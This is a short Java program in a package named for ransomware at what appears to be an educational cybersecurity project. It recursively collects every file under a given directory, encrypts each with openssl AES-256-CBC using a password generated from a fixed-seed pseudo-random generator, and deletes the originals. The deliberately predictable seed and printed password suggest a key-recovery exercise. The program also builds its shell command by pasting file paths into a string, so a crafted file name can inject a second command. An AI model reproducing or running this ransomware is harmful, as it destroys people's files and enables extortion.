package pl.edu.cybertron.ransomware;

import java.io.File;
import java.io.FileNotFoundException;
import java.nio.file.FileSystem;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class Ransomware {
    public static void main(String[] args) throws Exception {

        if (args.length != 1) {
            throw new Exception("Expected directory path in runtime arguments");
        }

        // initialize pseudo-random generator with a seed from current system time
        // long seed = System.currentTimeMillis();
        long seed = 1664016331101L;
        System.out.println(seed);
        Random random = new Random(seed);

        // generate random password
        String characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        int password_length = 32;
        String random_password = "";
        for (int i = 0; i < password_length; ++i) {
            random_password += characters.charAt(random.nextInt(characters.length()));
        }
        System.out.println(random_password);

        ProcessBuilder builder = new ProcessBuilder();

        ArrayList<File> files = getFiles(new File(args[0]));
        for (File file : files) {
            String path = file.getAbsolutePath();
            String new_path = path + ".enc";
            String command = "openssl aes-256-cbc -e -salt -pbkdf2 -in \"" + path + "\" -out \"" + new_path + "\" -k \"" + random_password + "\"";
            System.out.println(command);

            builder.command("sh", "-c", command);
            builder.start().waitFor();

            file.delete();
        }
    }

    public static ArrayList<File> getFiles(File file) throws FileNotFoundException {
        ArrayList<File> files = new ArrayList<>();

        if (file.isDirectory()) {
            for (File dfile : file.listFiles()) {
                files.addAll(getFiles(dfile));
            }
        }
        else if (file.exists()) {
            files.add(file);
        }
        else {
            throw new FileNotFoundException("File not found");
        }

        return files;
    }
}
